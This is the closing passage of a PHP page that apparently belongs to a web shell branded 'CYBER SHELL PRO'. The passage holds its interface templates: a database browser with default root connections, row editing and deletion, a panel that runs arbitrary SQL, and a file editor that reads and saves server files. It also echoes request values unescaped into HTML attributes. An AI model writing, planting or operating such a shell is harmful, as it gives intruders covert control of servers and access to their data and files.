                                                <button type="submit" name="db_action" value="connect" class="btn btn-outline-success w-100">
                                                    <i class="fas fa-link"></i> Connect to Database
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    <?php else: ?>
                        <!-- Database Connection Manager -->
                        <div class="row mb-4">
                            <div class="col-12">
                                <div class="hacker-card p-3">
                                    <div class="d-flex justify-content-between align-items-center">
                                        <h5 class="neon-text mb-0"><i class="fas fa-network-wired"></i> Database Connections</h5>
                                        <button class="btn btn-outline-info btn-sm" data-bs-toggle="modal" data-bs-target="#addConnectionModal">
                                            <i class="fas fa-plus"></i> Add Connection
                                        </button>
                                    </div>
                                    <div class="mt-2">
                                        <?php foreach ($_SESSION['databases'] as $name => $conn): ?>
                                            <form method="post" class="d-inline">
                                                <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                                                <input type="hidden" name="connection_name" value="<?= $name ?>">
                                                <button type="submit" name="db_action" value="switch_connection" 
                                                        class="btn btn-sm <?= $name === $currentConnection ? 'btn-success' : 'btn-outline-success' ?> me-2 mb-2">
                                                    <i class="fas fa-database"></i> <?= $name ?>
                                                    <?php if ($name === $currentConnection): ?>
                                                        <span class="badge bg-light text-dark">Active</span>
                                                    <?php endif; ?>
                                                </button>
                                            </form>
                                        <?php endforeach; ?>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Database Browser Interface -->
                        <div class="row">
                            <!-- Database Sidebar -->
                            <div class="col-md-3">
                                <div class="hacker-card db-sidebar">
                                    <div class="p-3 border-bottom">
                                        <h6 class="neon-text"><i class="fas fa-database"></i> Databases</h6>
                                        <?php foreach ($databases as $db): ?>
                                            <a href="<?= generateUrl(['db' => $db]) ?>" class="text-decoration-none">
                                                <div class="db-table <?= $db === $currentDatabase ? 'active' : '' ?>">
                                                    <i class="fas fa-database text-info"></i> <?= htmlspecialchars($db) ?>
                                                </div>
                                            </a>
                                        <?php endforeach; ?>
                                    </div>
                                    
                                    <?php if ($currentDatabase): ?>
                                        <div class="p-3">
                                            <h6 class="neon-blue"><i class="fas fa-table"></i> Tables in <?= htmlspecialchars($currentDatabase) ?></h6>
                                            <?php foreach ($tables as $table): ?>
                                                <a href="<?= generateUrl(['db' => $currentDatabase, 'table' => $table]) ?>" class="text-decoration-none">
                                                    <div class="db-table <?= $table === $currentTable ? 'active' : '' ?>">
                                                        <i class="fas fa-table text-warning"></i> <?= htmlspecialchars($table) ?>
                                                    </div>
                                                </a>
                                            <?php endforeach; ?>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>

                            <!-- Database Content -->
                            <div class="col-md-9">
                                <div id="dbMainContent">
                                    <?php if ($edit_row_mode && !empty($editing_row_data)): ?>
                                        <!-- Edit Row Form -->
                                        <div class="hacker-card p-4">
                                            <div class="d-flex justify-content-between align-items-center mb-4">
                                                <h4 class="neon-text">
                                                    <i class="fas fa-edit"></i> Edit Row in <?= htmlspecialchars($currentTable) ?>
                                                </h4>
                                                <a href="<?= generateUrl(['db' => $currentDatabase, 'table' => $currentTable]) ?>" class="btn btn-outline-secondary btn-sm">
                                                    <i class="fas fa-arrow-left"></i> Back to Table
                                                </a>
                                            </div>
                                            
                                            <form method="post">
                                                <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                                                <input type="hidden" name="db_name" value="<?= $currentDatabase ?>">
                                                <input type="hidden" name="table_name" value="<?= $currentTable ?>">
                                                <input type="hidden" name="primary_key" value="<?= $_GET['primary_key'] ?>">
                                                <input type="hidden" name="primary_value" value="<?= $_GET['primary_value'] ?>">
                                                <input type="hidden" name="db_action" value="update_row">
                                                
                                                <div class="row">
                                                    <?php foreach ($editing_row_data as $column => $value): ?>
                                                        <div class="col-md-6 mb-3">
                                                            <label class="form-label">
                                                                <?= htmlspecialchars($column) ?>
                                                                <?php if ($column === $_GET['primary_key']): ?>
                                                                    <span class="text-warning">(Primary Key)</span>
                                                                <?php endif; ?>
                                                            </label>
                                                            <?php if ($column === $_GET['primary_key']): ?>
                                                                <input type="text" 
                                                                       class="form-control bg-secondary text-white border-secondary" 
                                                                       value="<?= htmlspecialchars($value) ?>" 
                                                                       readonly
                                                                       style="cursor: not-allowed;">
                                                                <small class="text-muted">Primary key cannot be modified</small>
                                                            <?php else: ?>
                                                                <input type="text" 
                                                                       name="field_<?= $column ?>" 
                                                                       class="form-control bg-dark text-white border-secondary" 
                                                                       value="<?= htmlspecialchars($value) ?>">
                                                            <?php endif; ?>
                                                        </div>
                                                    <?php endforeach; ?>
                                                </div>
                                                
                                                <div class="mt-4">
                                                    <button type="submit" class="btn btn-outline-success me-2">
                                                        <i class="fas fa-save"></i> Update Row
                                                    </button>
                                                    <a href="<?= generateUrl(['db' => $currentDatabase, 'table' => $currentTable]) ?>" class="btn btn-outline-secondary">
                                                        <i class="fas fa-times"></i> Cancel
                                                    </a>
                                                </div>
                                            </form>
                                        </div>

                                    <?php elseif ($currentDatabase && $currentTable): ?>
                                        <!-- Table Data View -->
                                        <div class="hacker-card p-3">
                                            <div class="d-flex justify-content-between align-items-center mb-3">
                                                <h4 class="neon-text">
                                                    <i class="fas fa-table"></i> Table: <?= htmlspecialchars($currentTable) ?>
                                                    <small class="text-muted">(<?= $tableData['total_rows'] ?> rows)</small>
                                                </h4>
                                                <div>
                                                    <button class="btn btn-outline-success btn-sm clickable" data-bs-toggle="modal" data-bs-target="#insertRowModal">
                                                        <i class="fas fa-plus"></i> Insert Row
                                                    </button>
                                                    <button class="btn btn-outline-info btn-sm clickable" data-bs-toggle="modal" data-bs-target="#sqlQueryModal">
                                                        <i class="fas fa-terminal"></i> SQL Query
                                                    </button>
                                                </div>
                                            </div>
                                            
                                            <!-- Table Structure -->
                                            <div class="mt-4">
                                                <h5 class="neon-blue"><i class="fas fa-info-circle"></i> Table Structure</h5>
                                                <div class="table-responsive">
                                                    <table class="table table-dark table-sm">
                                                        <thead>
                                                            <tr>
                                                                <th>Field</th>
                                                                <th>Type</th>
                                                                <th>Null</th>
                                                                <th>Key</th>
                                                                <th>Default</th>
                                                                <th>Extra</th>
                                                            </tr>
                                                        </thead>
                                                        <tbody>
                                                            <?php foreach ($tableData['structure'] as $column): ?>
                                                                <tr>
                                                                    <td><code class="text-info"><?= $column['Field'] ?></code></td>
                                                                    <td><small><?= $column['Type'] ?></small></td>
                                                                    <td><?= $column['Null'] ?></td>
                                                                    <td><?= $column['Key'] ?></td>
                                                                    <td><?= $column['Default'] ?? 'NULL' ?></td>
                                                                    <td><?= $column['Extra'] ?></td>
                                                                </tr>
                                                            <?php endforeach; ?>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div>

                                            <!-- Table Data -->
                                            <div class="mt-4">
                                                <h5 class="neon-purple"><i class="fas fa-database"></i> Table Data</h5>
                                                <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
                                                    <table class="table table-dark table-sm table-striped">
                                                        <thead>
                                                            <tr>
                                                                <?php if (!empty($tableData['data'])): ?>
                                                                    <?php foreach (array_keys($tableData['data'][0]) as $column): ?>
                                                                        <th><?= htmlspecialchars($column) ?></th>
                                                                    <?php endforeach; ?>
                                                                    <th>Actions</th>
                                                                <?php endif; ?>
                                                            </tr>
                                                        </thead>
                                                        <tbody>
                                                            <?php foreach ($tableData['data'] as $row): ?>
                                                                <tr>
                                                                    <?php foreach ($row as $column => $value): ?>
                                                                        <td>
                                                                            <small><?= htmlspecialchars(substr(strval($value), 0, 100)) ?><?= strlen(strval($value)) > 100 ? '...' : '' ?></small>
                                                                        </td>
                                                                    <?php endforeach; ?>
                                                                    <td>
                                                                        <div class="btn-group btn-group-sm">
                                                                            <!-- Edit Button - Simple URL-based approach -->
                                                                            <a href="<?= generateUrl([
                                                                                'edit_row' => '1',
                                                                                'primary_key' => array_keys($row)[0],
                                                                                'primary_value' => $row[array_keys($row)[0]]
                                                                            ]) ?>" class="btn btn-outline-warning db-action-btn" title="Edit Row">
                                                                                <i class="fas fa-edit"></i>
                                                                            </a>
                                                                            
                                                                            <!-- Delete Button - Simple form approach -->
                                                                            <form method="post" class="inline-form" onsubmit="return confirm('Are you sure you want to delete this row?')">
                                                                                <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                                                                                <input type="hidden" name="db_name" value="<?= $currentDatabase ?>">
                                                                                <input type="hidden" name="table_name" value="<?= $currentTable ?>">
                                                                                <input type="hidden" name="primary_key" value="<?= array_keys($row)[0] ?>">
                                                                                <input type="hidden" name="primary_value" value="<?= $row[array_keys($row)[0]] ?>">
                                                                                <input type="hidden" name="db_action" value="delete_row">
                                                                                <button type="submit" class="btn btn-outline-danger db-action-btn" title="Delete Row">
                                                                                    <i class="fas fa-trash"></i>
                                                                                </button>
                                                                            </form>
                                                                        </div>
                                                                    </td>
                                                                </tr>
                                                            <?php endforeach; ?>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div>
                                        </div>

                                        <!-- Insert Row Modal -->
                                        <div class="modal fade" id="insertRowModal" tabindex="-1">
                                            <div class="modal-dialog modal-lg">
                                                <div class="modal-content bg-dark text-white">
                                                    <div class="modal-header border-secondary">
                                                        <h5 class="modal-title"><i class="fas fa-plus"></i> Insert New Row into <?= htmlspecialchars($currentTable) ?></h5>
                                                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                                                    </div>
                                                    <form method="post">
                                                        <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                                                        <input type="hidden" name="db_name" value="<?= $currentDatabase ?>">
                                                        <input type="hidden" name="table_name" value="<?= $currentTable ?>">
                                                        <input type="hidden" name="db_action" value="insert_row">
                                                        <div class="modal-body">
                                                            <?php foreach ($tableData['structure'] as $column): ?>
                                                                <div class="mb-3">
                                                                    <label class="form-label"><?= $column['Field'] ?> <small class="text-muted">(<?= $column['Type'] ?>)</small></label>
                                                                    <input type="text" name="field_<?= $column['Field'] ?>" class="form-control bg-dark text-white border-secondary" 
                                                                           placeholder="<?= $column['Default'] ? 'Default: ' . $column['Default'] : 'Enter value' ?>">
                                                                </div>
                                                            <?php endforeach; ?>
                                                        </div>
                                                        <div class="modal-footer border-secondary">
                                                            <button type="submit" class="btn btn-outline-success">Insert Row</button>
                                                            <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                        <!-- SQL Query Modal -->
                                        <div class="modal fade" id="sqlQueryModal" tabindex="-1">
                                            <div class="modal-dialog modal-lg">
                                                <div class="modal-content bg-dark text-white">
                                                    <div class="modal-header border-secondary">
                                                        <h5 class="modal-title"><i class="fas fa-terminal"></i> Execute SQL Query</h5>
                                                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                                                    </div>
                                                    <form method="post">
                                                        <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                                                        <input type="hidden" name="db_name" value="<?= $currentDatabase ?>">
                                                        <input type="hidden" name="db_action" value="execute_query">
                                                        <div class="modal-body">
                                                            <div class="mb-3">
                                                                <label class="form-label">SQL Query:</label>
                                                                <textarea name="sql_query" class="form-control bg-dark text-white border-secondary" rows="6" placeholder="SELECT * FROM <?= htmlspecialchars($currentTable) ?> LIMIT 10">SELECT * FROM `<?= htmlspecialchars($currentTable) ?>` LIMIT 10</textarea>
                                                            </div>
                                                            <div class="form-text text-info">
                                                                <i class="fas fa-info-circle"></i> You can execute any SQL query on the current database
                                                            </div>
                                                        </div>
                                                        <div class="modal-footer border-secondary">
                                                            <button type="submit" class="btn btn-outline-success">Execute Query</button>
                                                            <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>

                                    <?php elseif ($currentDatabase): ?>
                                        <!-- Database Info -->
                                        <div class="hacker-card p-4 text-center">
                                            <h4 class="neon-text"><i class="fas fa-database"></i> <?= htmlspecialchars($currentDatabase) ?></h4>
                                            <p class="text-muted">Select a table from the sidebar to view its data</p>
                                            <div class="row mt-4">
                                                <div class="col-md-4">
                                                    <div class="hacker-card p-3">
                                                        <h6 class="text-info">Tables</h6>
                                                        <div class="display-6"><?= count($tables) ?></div>
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="hacker-card p-3">
                                                        <h6 class="text-warning">Connected as</h6>
                                                        <div><?= htmlspecialchars($_SESSION['databases'][$currentConnection]['user']) ?></div>
                                                    </div>
                                                </div>
                                                <div class="col-md-4">
                                                    <div class="hacker-card p-3">
                                                        <h6 class="text-success">Host</h6>
                                                        <div><?= htmlspecialchars($_SESSION['databases'][$currentConnection]['host']) ?></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    <?php else: ?>
                                        <!-- Database Selection -->
                                        <div class="hacker-card p-5 text-center">
                                            <h4 class="neon-text"><i class="fas fa-database"></i> Database Browser</h4>
                                            <p class="text-muted">Select a database from the sidebar to get started</p>
                                            <div class="row mt-4">
                                                <div class="col-md-6">
                                                    <div class="hacker-card p-3">
                                                        <h6 class="text-info">Total Databases</h6>
                                                        <div class="display-6"><?= count($databases) ?></div>
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="hacker-card p-3">
                                                        <h6 class="text-success">Connection</h6>
                                                        <div class="text-success">✅ Active</div>
                                                        <small><?= htmlspecialchars($_SESSION['databases'][$currentConnection]['user']) ?>@<?= htmlspecialchars($_SESSION['databases'][$currentConnection]['host']) ?></small>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Code Editor Tab -->
            <?php if ($editor_mode): ?>
            <div class="tab-pane fade show active" id="editor" role="tabpanel">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <h2 class="neon-text"><i class="fas fa-code"></i> Code Editor</h2>
                    <div>
                        <span class="text-info">Editing: </span>
                        <code class="text-warning"><?= htmlspecialchars($editing_file) ?></code>
                        <a href="<?= generateUrl() ?>" class="btn btn-outline-success btn-sm ms-2">
                            <i class="fas fa-arrow-left"></i> Back to Files
                        </a>
                    </div>
                </div>

                <form method="post">
                    <input type="hidden" name="file_name" value="<?= basename($editing_file) ?>">
                    <div class="editor-container">
                        <div class="editor-toolbar">
                            <button type="button" class="clickable" onclick="formatCode('mainEditor')"><i class="fas fa-code"></i> Format</button>
                            <button type="button" class="clickable" onclick="insertTemplate('mainEditor')"><i class="fas fa-magic"></i> Template</button>
                            <button type="button" class="clickable" onclick="searchInEditor('mainEditor')"><i class="fas fa-search"></i> Find</button>
                            <button type="submit" class="clickable"><i class="fas fa-save"></i> Save</button>
                        </div>
                        <div class="editor-wrapper">
                            <textarea 
                                id="mainEditor" 
                                name="file_content" 
                                class="editor" 
                                spellcheck="false"><?php
                                if (is_readable($editing_file)) {
                                    $content = file_get_contents($editing_file);
                                    if ($content !== false) {
                                        echo htmlspecialchars($content);
                                    } else {
                                        echo "Error reading file! Check permissions.";
                                    }
                                } else {
                                    echo "File not readable!";
                                }
                            ?></textarea>
                        </div>
                    </div>
                </form>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Add Connection Modal -->
    <div class="modal fade" id="addConnectionModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-white">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title"><i class="fas fa-plus"></i> Add New Database Connection</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                    <div class="modal-body">
                        <div class="row g-3">
                            <div class="col-md-6">
                                <input type="text" name="db_host" class="form-control bg-dark text-white border-secondary" placeholder="Host" value="localhost" required>
                            </div>
                            <div class="col-md-6">
                                <input type="text" name="db_user" class="form-control bg-dark text-white border-secondary" placeholder="User" value="root" required>
                            </div>
                            <div class="col-12">
                                <input type="password" name="db_pass" class="form-control bg-dark text-white border-secondary" placeholder="Password">
                            </div>
                            <div class="col-12">
                                <input type="text" name="connection_name" class="form-control bg-dark text-white border-secondary" placeholder="Connection Name" required>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer border-secondary">
                        <button type="submit" name="db_action" value="connect" class="btn btn-outline-success">Connect</button>
                        <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Editor functions
        function formatCode(editorId) {
            const editor = document.getElementById(editorId);
            if (editor) {
                const code = editor.value;
                editor.value = code.replace(/\t/g, '    ').replace(/\n\s*\n\s*\n/g, '\n\n');
            }
        }

        function insertTemplate(editorId) {
            const editor = document.getElementById(editorId);
            if (editor) {
                const template = '<?php\n// PHP code here\necho "Hello World";\n?>';
                editor.value = template + '\n' + editor.value;
            }
        }

        function searchInEditor(editorId) {
            const editor = document.getElementById(editorId);
            if (editor) {
                const searchTerm = prompt('Enter search term:');
                if (searchTerm) {
                    const content = editor.value;
                    const index = content.indexOf(searchTerm);
                    if (index !== -1) {
                        editor.focus();
                        editor.setSelectionRange(index, index + searchTerm.length);
                    } else {
                        alert('Text not found!');
                    }
                }
            }
        }

        // Add tab support to editors
        document.addEventListener('DOMContentLoaded', function() {
            // Make sure all elements are clickable
            document.querySelectorAll('.btn, .clickable, a').forEach(element => {
                element.style.cursor = 'pointer';
            });

            // Add tab support to all editors
            document.querySelectorAll('.editor').forEach(editor => {
                editor.addEventListener('keydown', function(e) {
                    if (e.key === 'Tab') {
                        e.preventDefault();
                        const start = this.selectionStart;
                        const end = this.selectionEnd;
                        
                        this.value = this.value.substring(0, start) + '    ' + this.value.substring(end);
                        this.selectionStart = this.selectionEnd = start + 4;
                    }
                });
            });

            console.log('🚀 CYBER SHELL PRO - Database Manager Ready!');
        });
    </script>
</body>
</html>
